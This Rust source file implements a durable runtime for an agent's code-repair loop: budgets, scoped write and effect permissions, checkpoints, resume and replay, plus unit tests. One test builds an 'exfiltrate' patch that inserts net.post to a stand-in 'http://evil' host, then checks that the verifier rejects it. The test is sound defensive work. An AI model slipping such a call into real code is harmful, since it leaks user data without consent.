//! The durable goal runtime.
//!
//! This is the layer that turns the deterministic repair loop into something a
//! long-horizon agent can lean on: a run that is *budgeted*, *authority-scoped*,
//! *checkpointed*, *resumable*, and *replayable*. It reuses the exact same repair
//! leaves as `tach fix` — collect the diagnostics, pick the next one, build its
//! typed patch, verify it through the pipeline — but wraps each step in an event,
//! a checkpoint, and a policy gate derived from the goal's `allow` block.
//!
//! The single most important property: **resume never duplicates work.** A
//! checkpoint captures the post-step workspace, so picking up from it continues
//! with only the diagnostics that remain. A run can crash after any step and
//! resume to exactly where it left off.

use crate::agent::{self, Strategy};
use crate::event::{kind, EventLog};
use crate::goal::GoalSpec;
use crate::patch::{verify_patch, VerifyOpts, Workspace};
use crate::store::{self, events_path, Checkpoint, GoalRecord, RunState};
use serde_json::json;
use std::collections::BTreeMap;
use std::io;
use std::path::Path;

/// The result of driving (or partially driving) a run.
pub struct RunResult {
    pub state: RunState,
    pub final_files: BTreeMap<String, String>,
    /// True when the run stopped on a simulated crash (`--crash-after`) rather
    /// than reaching a terminal status. The durable state is fully persisted; the
    /// run is resumable.
    pub crashed: bool,
}

/// Map a stored strategy label back to its `Strategy`.
pub fn strategy_from_label(label: &str) -> Strategy {
    match label {
        "convert" => Strategy::Convert,
        "strict" => Strategy::Strict,
        _ => Strategy::Minimal,
    }
}

/// The outcome of evaluating one step against the current workspace. This is the
/// shared core both the durable driver and the pure replay simulator consume, so
/// the two can never diverge in *what* they decide — only in whether they persist.
enum StepOutcome {
    /// Success: no errors remain and the goal's success conditions hold.
    Done { passed: usize, failed: usize },
    /// No actionable diagnostic — deterministic repair is out of moves.
    NoAction {
        errors: usize,
        passed: usize,
        failed: usize,
    },
    /// A patch was proposed and verified (accepted or not). Boxed because it is by
    /// far the largest variant and dwarfs the two terminal ones.
    Patch(Box<StepPatch>),
}

/// The detail of a proposed-and-verified step.
struct StepPatch {
    accepted: bool,
    new_ws: Workspace,
    diag: agent::DiagSummary,
    patch: agent::PatchSummary,
    verdict: agent::VerdictSummary,
    new_effects: Vec<String>,
    rejections: Vec<String>,
    regressed: bool,
    tests_run: usize,
    diff_chars: usize,
}

/// Evaluate exactly one repair step under a goal's authority. Pure — it reads the
/// workspace and returns a decision, touching neither disk nor the event log.
fn step_once(ws: &Workspace, spec: &GoalSpec, strategy: Strategy) -> StepOutcome {
    let (errors, warnings, report) = agent::collect_problems(ws);
    let require_tests = spec.requires_tests_pass();
    let success = errors.is_empty() && (!require_tests || report.all_green());
    if success {
        return StepOutcome::Done {
            passed: report.passed,
            failed: report.failed,
        };
    }
    let diag = match agent::pick_candidate(&errors, &warnings, strategy) {
        Some(d) => d,
        None => {
            return StepOutcome::NoAction {
                errors: errors.len(),
                passed: report.passed,
                failed: report.failed,
            }
        }
    };
    let patch = agent::build_patch(diag, strategy, ws);
    let opts = VerifyOpts {
        allow_new_effects: false,
        forbid_api_break: false,
        allowed_effects: Some(spec.allowed_effects()),
        allowed_writes: spec.allowed_writes(),
    };
    let verdict = verify_patch(ws, &patch, &opts);
    let regressed = verdict.rejections.iter().any(|r| r.contains("regressed"));
    let diff_chars = patch.edits.iter().map(|e| e.replacement.len()).sum();
    StepOutcome::Patch(Box::new(StepPatch {
        accepted: verdict.accepted,
        new_ws: if verdict.accepted {
            verdict.workspace.clone()
        } else {
            ws.clone()
        },
        diag: agent::diag_summary(diag, ws),
        patch: agent::patch_summary(&patch),
        verdict: agent::verdict_summary(&verdict),
        new_effects: verdict.new_effects.clone(),
        rejections: verdict.rejections.clone(),
        regressed,
        tests_run: verdict.tests_run(),
        diff_chars,
    }))
}

/// Start a brand-new run: persist the goal record, open a fresh event log, and
/// drive to a terminal status (or a simulated crash).
pub fn start_run(
    repo: &Path,
    spec: GoalSpec,
    base: Workspace,
    strategy: Strategy,
    crash_after: Option<u64>,
) -> io::Result<RunResult> {
    // A fingerprint identifies the *goal over this source*; a run id identifies
    // *this run instance*. Allocating from the fingerprint guarantees a fresh run
    // never collides with — or overwrites — a previous run's durable history.
    let fingerprint = store::fingerprint(&spec.name, &base.files);
    let run_id = store::allocate_run(repo, &fingerprint)?;
    let record = GoalRecord {
        spec: spec.clone(),
        strategy: strategy.label().to_string(),
        base_files: base.files.clone(),
    };
    store::save_goal(repo, &run_id, &record)?;

    let mut log = EventLog::create(&events_path(repo, &run_id), &run_id)?;
    log.append(
        kind::RUN_STARTED,
        json!({
            "goal": spec.name,
            "strategy": strategy.label(),
            "budget": { "steps": spec.step_budget(), "retries": spec.retry_budget() },
        }),
    )?;
    log.append(
        kind::WORKSPACE_LOADED,
        json!({ "files": base.files.keys().collect::<Vec<_>>() }),
    )?;

    let state = RunState {
        run_id: run_id.clone(),
        goal: spec.name.clone(),
        status: "running".into(),
        step: 0,
        consecutive_rejections: 0,
        patches_applied: 0,
        patches_rejected: 0,
        tests_run: 0,
        regressions: 0,
        diff_chars: 0,
        final_errors: 0,
        tests_passed: 0,
        tests_failed: 0,
    };
    store::save_state(repo, &state)?;

    drive(repo, &spec, strategy, base, state, &mut log, crash_after)
}

/// Resume a previously-crashed (or merely incomplete) run from its last
/// checkpoint, continuing the same event log.
pub fn resume_run(repo: &Path, run_id: &str, crash_after: Option<u64>) -> io::Result<RunResult> {
    let record = store::load_goal(repo, run_id)?;
    let spec = record.spec;
    let strategy = strategy_from_label(&record.strategy);
    let mut state = store::load_state(repo, run_id)?;

    let mut ws = Workspace::new();
    match store::load_latest_checkpoint(repo, run_id) {
        Ok(cp) => {
            for (k, v) in &cp.files {
                ws.insert(k.clone(), v.clone());
            }
        }
        Err(_) => {
            for (k, v) in &record.base_files {
                ws.insert(k.clone(), v.clone());
            }
        }
    }

    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(kind::RUN_RESUMED, json!({ "from_step": state.step }))?;
    state.status = "running".into();
    drive(repo, &spec, strategy, ws, state, &mut log, crash_after)
}

/// The durable loop. Each iteration: enforce the step budget, evaluate one step,
/// emit its events, checkpoint, and persist state. A `crash_after` returns early
/// without finalizing — leaving a resumable run behind.
fn drive(
    repo: &Path,
    spec: &GoalSpec,
    strategy: Strategy,
    mut ws: Workspace,
    mut state: RunState,
    log: &mut EventLog,
    crash_after: Option<u64>,
) -> io::Result<RunResult> {
    let run_id = state.run_id.clone();
    let step_budget = spec.step_budget();
    let retry_budget = spec.retry_budget();

    loop {
        // Budget gate first: a run that has spent its steps without succeeding is
        // exhausted, full stop.
        if state.step >= step_budget {
            let (errors, _w, report) = agent::collect_problems(&ws);
            state.status = "budget_exhausted".into();
            state.final_errors = errors.len();
            state.tests_passed = report.passed;
            state.tests_failed = report.failed;
            log.append(
                kind::BUDGET_EXHAUSTED,
                json!({ "steps": state.step, "limit": step_budget }),
            )?;
            store::save_state(repo, &state)?;
            return Ok(RunResult {
                state,
                final_files: ws.files,
                crashed: false,
            });
        }

        match step_once(&ws, spec, strategy) {
            StepOutcome::Done { passed, failed } => {
                state.status = "completed".into();
                state.final_errors = 0;
                state.tests_passed = passed;
                state.tests_failed = failed;
                log.append(
                    kind::RUN_COMPLETED,
                    json!({ "steps": state.step, "patches_applied": state.patches_applied, "tests_passed": passed }),
                )?;
                store::save_state(repo, &state)?;
                return Ok(RunResult {
                    state,
                    final_files: ws.files,
                    crashed: false,
                });
            }
            StepOutcome::NoAction {
                errors,
                passed,
                failed,
            } => {
                state.status = "failed".into();
                state.final_errors = errors;
                state.tests_passed = passed;
                state.tests_failed = failed;
                log.append(
                    kind::RUN_FAILED,
                    json!({ "reason": "no actionable diagnostic — needs a model-backed coder", "errors": errors }),
                )?;
                store::save_state(repo, &state)?;
                return Ok(RunResult {
                    state,
                    final_files: ws.files,
                    crashed: false,
                });
            }
            StepOutcome::Patch(p) => {
                let StepPatch {
                    accepted,
                    new_ws,
                    diag,
                    patch,
                    verdict,
                    new_effects,
                    rejections,
                    regressed,
                    tests_run,
                    diff_chars,
                } = *p;
                let next_step = state.step + 1;
                state.tests_run += tests_run;
                if regressed {
                    state.regressions += 1;
                }
                log.append(
                    kind::DIAGNOSTIC_EMITTED,
                    serde_json::to_value(&diag).unwrap_or_default(),
                )?;
                log.append(
                    kind::PATCH_PROPOSED,
                    serde_json::to_value(&patch).unwrap_or_default(),
                )?;
                if !new_effects.is_empty() {
                    log.append(
                        kind::EFFECT_DELTA_DETECTED,
                        json!({ "new_effects": new_effects }),
                    )?;
                }

                if accepted {
                    state.patches_applied += 1;
                    state.diff_chars += diff_chars;
                    state.consecutive_rejections = 0;
                    ws = new_ws;
                    log.append(
                        kind::PATCH_VERIFIED,
                        serde_json::to_value(&verdict).unwrap_or_default(),
                    )?;
                    log.append(kind::PATCH_APPLIED, json!({ "patch": patch.name }))?;
                    log.append(
                        kind::TEST_COMPLETED,
                        json!({ "passed": verdict.tests_passed, "failed": verdict.tests_failed }),
                    )?;
                } else {
                    state.patches_rejected += 1;
                    state.consecutive_rejections += 1;
                    log.append(
                        kind::PATCH_REJECTED,
                        json!({ "patch": patch.name, "rejections": rejections }),
                    )?;
                    log.append(
                        kind::TEST_COMPLETED,
                        json!({ "passed": verdict.tests_passed, "failed": verdict.tests_failed }),
                    )?;
                }

                // Advance and checkpoint — this step is now durable.
                state.step = next_step;
                let cp = Checkpoint {
                    step: next_step,
                    status: "running".into(),
                    files: ws.files.clone(),
                    consecutive_rejections: state.consecutive_rejections,
                    patches_applied: state.patches_applied,
                    patches_rejected: state.patches_rejected,
                    tests_run: state.tests_run,
                    regressions: state.regressions,
                    diff_chars: state.diff_chars,
                };
                store::save_checkpoint(repo, &run_id, &cp)?;
                log.append(kind::CHECKPOINT_WRITTEN, json!({ "step": next_step }))?;
                store::save_state(repo, &state)?;

                // Simulated crash: stop here, fully durable, without finalizing.
                if crash_after == Some(next_step) {
                    return Ok(RunResult {
                        state,
                        final_files: ws.files,
                        crashed: true,
                    });
                }

                // Out of retries on a stubborn rejection: give up cleanly.
                if !accepted && state.consecutive_rejections > retry_budget {
                    let (errors, _w, report) = agent::collect_problems(&ws);
                    state.status = "failed".into();
                    state.final_errors = errors.len();
                    state.tests_passed = report.passed;
                    state.tests_failed = report.failed;
                    log.append(
                        kind::RUN_FAILED,
                        json!({ "reason": "retry budget exhausted", "rejections": state.patches_rejected }),
                    )?;
                    store::save_state(repo, &state)?;
                    return Ok(RunResult {
                        state,
                        final_files: ws.files,
                        crashed: false,
                    });
                }
            }
        }
    }
}

/// Mark a run cancelled. Idempotent; records a `run.cancelled` event.
pub fn cancel_run(repo: &Path, run_id: &str) -> io::Result<RunState> {
    let mut state = store::load_state(repo, run_id)?;
    if state.status == "completed" || state.status == "cancelled" {
        return Ok(state);
    }
    state.status = "cancelled".into();
    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(kind::RUN_CANCELLED, json!({ "at_step": state.step }))?;
    store::save_state(repo, &state)?;
    Ok(state)
}

/// The result of a deterministic replay.
pub struct ReplayResult {
    pub recorded_status: String,
    pub replayed_status: String,
    pub identical: bool,
    pub steps: u64,
}

/// Re-run a recorded goal from its base source, with no persistence and no crash,
/// and prove it reproduces the recorded final state byte-for-byte.
pub fn replay_run(repo: &Path, run_id: &str) -> io::Result<ReplayResult> {
    let record = store::load_goal(repo, run_id)?;
    let recorded = store::load_state(repo, run_id)?;
    let recorded_files = store::load_latest_checkpoint(repo, run_id)
        .map(|cp| cp.files)
        .unwrap_or_else(|_| record.base_files.clone());

    let spec = record.spec;
    let strategy = strategy_from_label(&record.strategy);
    let mut ws = Workspace::new();
    for (k, v) in &record.base_files {
        ws.insert(k.clone(), v.clone());
    }
    let (status, files, steps) = simulate(&spec, strategy, ws);

    let identical = status == recorded.status && files == recorded_files;
    Ok(ReplayResult {
        recorded_status: recorded.status,
        replayed_status: status,
        identical,
        steps,
    })
}

/// The pure replay loop: the same decisions as `drive`, with no I/O. Returns the
/// terminal status, the final workspace files, and the number of steps taken.
fn simulate(
    spec: &GoalSpec,
    strategy: Strategy,
    mut ws: Workspace,
) -> (String, BTreeMap<String, String>, u64) {
    let step_budget = spec.step_budget();
    let retry_budget = spec.retry_budget();
    let mut step = 0u64;
    let mut consec = 0u64;
    loop {
        if step >= step_budget {
            return ("budget_exhausted".into(), ws.files, step);
        }
        match step_once(&ws, spec, strategy) {
            StepOutcome::Done { .. } => return ("completed".into(), ws.files, step),
            StepOutcome::NoAction { .. } => return ("failed".into(), ws.files, step),
            StepOutcome::Patch(p) => {
                step += 1;
                if p.accepted {
                    ws = p.new_ws;
                    consec = 0;
                } else {
                    consec += 1;
                    if consec > retry_budget {
                        return ("failed".into(), ws.files, step);
                    }
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::read_all;
    use crate::goal;
    use crate::program::Program;
    use crate::project::{DEMO_AUTH, DEMO_GOAL, DEMO_TEST};
    use crate::source::SourceFile;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicU64, Ordering};

    /// A throwaway repo directory, removed when the test ends.
    struct TempRepo(PathBuf);

    impl TempRepo {
        fn new(tag: &str) -> Self {
            static N: AtomicU64 = AtomicU64::new(0);
            let n = N.fetch_add(1, Ordering::Relaxed);
            let dir =
                std::env::temp_dir().join(format!("tach_rt_{}_{}_{}", std::process::id(), tag, n));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            TempRepo(dir)
        }
        fn path(&self) -> &Path {
            &self.0
        }
    }

    impl Drop for TempRepo {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    /// The demo's broken auth project plus its goal, as a base workspace + spec.
    fn demo() -> (GoalSpec, Workspace) {
        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("goal.tach", DEMO_GOAL)]);
        assert!(
            diags.iter().all(|d| !d.is_error()),
            "goal must parse: {:?}",
            diags
        );
        let decl = goal::find_goal(&prog, "FixFailingTests").expect("demo goal");
        let spec = GoalSpec::from_decl(decl);
        let mut ws = Workspace::new();
        ws.insert("src/auth.tach", DEMO_AUTH);
        ws.insert("tests/auth_test.tach", DEMO_TEST);
        (spec, ws)
    }

    #[test]
    fn run_reaches_completed_and_writes_history() {
        let repo = TempRepo::new("complete");
        let (spec, ws) = demo();
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        assert_eq!(r.state.status, "completed", "state: {:?}", r.state.status);
        assert_eq!(r.state.patches_applied, 3);
        assert_eq!(r.state.regressions, 0);
        assert_eq!(r.state.tests_failed, 0);

        // The event log records the whole run, terminated by run.completed.
        let events = read_all(&store::events_path(repo.path(), &r.state.run_id)).unwrap();
        assert!(events.iter().any(|e| e.kind == kind::RUN_STARTED));
        assert_eq!(
            events
                .iter()
                .filter(|e| e.kind == kind::PATCH_APPLIED)
                .count(),
            3
        );
        assert_eq!(events.last().unwrap().kind, kind::RUN_COMPLETED);
        // Sequence numbers are contiguous from 1.
        for (i, e) in events.iter().enumerate() {
            assert_eq!(e.seq, i as u64 + 1);
            assert_eq!(e.schema, crate::event::EVENT_SCHEMA);
        }
    }

    #[test]
    fn crash_then_resume_does_not_duplicate_work() {
        let repo = TempRepo::new("resume");
        let (spec, ws) = demo();

        // Crash after the 2nd step. The run is durable but not finalized.
        let crashed = start_run(repo.path(), spec, ws, Strategy::Minimal, Some(2)).unwrap();
        assert!(crashed.crashed);
        assert_eq!(crashed.state.status, "running");
        assert_eq!(crashed.state.step, 2);
        assert_eq!(crashed.state.patches_applied, 2);
        let run_id = crashed.state.run_id.clone();

        // Resume picks up from the checkpoint and finishes.
        let resumed = resume_run(repo.path(), &run_id, None).unwrap();
        assert_eq!(resumed.state.status, "completed");
        // The total applied across the whole run is exactly 3 — the third patch
        // was applied once, on resume; the first two were NOT repeated.
        assert_eq!(
            resumed.state.patches_applied, 3,
            "resume must not duplicate patches"
        );

        // Exactly three patch.applied events exist across the entire history.
        let events = read_all(&store::events_path(repo.path(), &run_id)).unwrap();
        assert_eq!(
            events
                .iter()
                .filter(|e| e.kind == kind::PATCH_APPLIED)
                .count(),
            3,
            "history must show three applied patches, not more"
        );
        assert!(events.iter().any(|e| e.kind == kind::RUN_RESUMED));

        // The resumed run is byte-identical to an uninterrupted one.
        let repo2 = TempRepo::new("straight");
        let (spec2, ws2) = demo();
        let straight = start_run(repo2.path(), spec2, ws2, Strategy::Minimal, None).unwrap();
        assert_eq!(resumed.final_files, straight.final_files);
    }

    #[test]
    fn replay_reproduces_a_completed_run() {
        let repo = TempRepo::new("replay");
        let (spec, ws) = demo();
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        let replay = replay_run(repo.path(), &r.state.run_id).unwrap();
        assert!(
            replay.identical,
            "replay diverged: {:?} vs {:?}",
            replay.recorded_status, replay.replayed_status
        );
        assert_eq!(replay.replayed_status, "completed");
    }

    #[test]
    fn fingerprint_is_deterministic_offline() {
        let (_, ws) = demo();
        let a = store::fingerprint("FixFailingTests", &ws.files);
        let b = store::fingerprint("FixFailingTests", &ws.files);
        assert_eq!(a, b);
        assert!(a.starts_with("run_"));
        // A different goal name yields a different fingerprint.
        assert_ne!(a, store::fingerprint("Other", &ws.files));
    }

    #[test]
    fn repeated_runs_get_distinct_ids_and_never_overwrite_history() {
        // Running the same goal over the same source twice in one store must
        // produce two distinct runs — the second must not truncate the first's
        // history. This is the property a real long-horizon runtime depends on.
        let repo = TempRepo::new("repeat");
        let (spec1, ws1) = demo();
        let first = start_run(repo.path(), spec1, ws1, Strategy::Minimal, None).unwrap();
        let (spec2, ws2) = demo();
        let second = start_run(repo.path(), spec2, ws2, Strategy::Minimal, None).unwrap();

        // The first run keeps the clean fingerprint id; the second is uniquified.
        let fp = store::fingerprint("FixFailingTests", &demo().1.files);
        assert_eq!(first.state.run_id, fp);
        assert_ne!(first.state.run_id, second.state.run_id);
        assert!(second.state.run_id.starts_with(&format!("{}-", fp)));

        // Both histories survive independently, each ending in run.completed.
        for id in [&first.state.run_id, &second.state.run_id] {
            let events = read_all(&store::events_path(repo.path(), id)).unwrap();
            assert_eq!(
                events
                    .iter()
                    .filter(|e| e.kind == kind::PATCH_APPLIED)
                    .count(),
                3,
                "history for {id} is intact"
            );
            assert_eq!(events.last().unwrap().kind, kind::RUN_COMPLETED);
        }

        // The store reports both as runs of the same fingerprint.
        assert_eq!(store::runs_for_fingerprint(repo.path(), &fp).len(), 2);
    }

    #[test]
    fn event_log_create_refuses_to_clobber() {
        // The last line of defense: even handed a path whose history exists,
        // EventLog::create must refuse rather than truncate.
        let repo = TempRepo::new("noclobber");
        let path = repo.path().join("events.jsonl");
        let mut log = EventLog::create(&path, "run_x").unwrap();
        log.append("run.started", serde_json::json!({})).unwrap();
        assert!(EventLog::create(&path, "run_x").is_err());
        // The original line is still there.
        assert_eq!(read_all(&path).unwrap().len(), 1);
    }

    #[test]
    fn out_of_scope_writes_are_rejected_and_the_run_fails() {
        // A goal that may only write tests/** cannot repair bugs that live in
        // src/**: every patch is rejected before it touches the tree.
        let repo = TempRepo::new("scope");
        let (mut spec, ws) = demo();
        spec.allow.fs_write = vec!["tests/**".into()];
        spec.budget.retries = Some(1);
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        assert_eq!(r.state.status, "failed");
        assert_eq!(r.state.patches_applied, 0);
        assert!(r.state.patches_rejected >= 1);

        let events = read_all(&store::events_path(repo.path(), &r.state.run_id)).unwrap();
        assert!(events.iter().any(|e| e.kind == kind::PATCH_REJECTED));
        assert!(events.iter().all(|e| e.kind != kind::PATCH_APPLIED));
    }

    #[test]
    fn effect_authority_blocks_an_ungranted_effect() {
        // A goal granted no effects must reject any patch that would make the
        // program perform a brand-new effect — even via the deterministic loop.
        // We model the danger directly through the pipeline the runtime uses.
        use crate::patch::{verify_patch, Edit, Patch, VerifyOpts};
        let mut ws = Workspace::new();
        ws.insert("src/m.tach", "fn pure(x: Int) -> Int {\n  return x\n}\n");
        ws.insert(
            "tests/m_test.tach",
            "test \"id\" {\n  ensure pure(2) == 2\n}\n",
        );
        let at = "fn pure(x: Int) -> Int {\n  ".len();
        let patch = Patch {
            name: "sneak-net".into(),
            reason: "exfiltrate".into(),
            touches: vec!["src/**".into()],
            edits: vec![Edit {
                file: "src/m.tach".into(),
                span: crate::span::Span::at(at),
                replacement: "net.post(\"http://evil\", \"x\")\n  ".into(),
            }],
            prove: vec![],
        };
        let opts = VerifyOpts {
            allow_new_effects: false,
            forbid_api_break: false,
            allowed_effects: Some(std::collections::BTreeSet::new()),
            allowed_writes: Some(vec!["src/**".into()]),
        };
        let v = verify_patch(&ws, &patch, &opts);
        assert!(!v.accepted);
        assert!(v
            .rejections
            .iter()
            .any(|r| r.contains("outside the goal's authority")));
    }
}
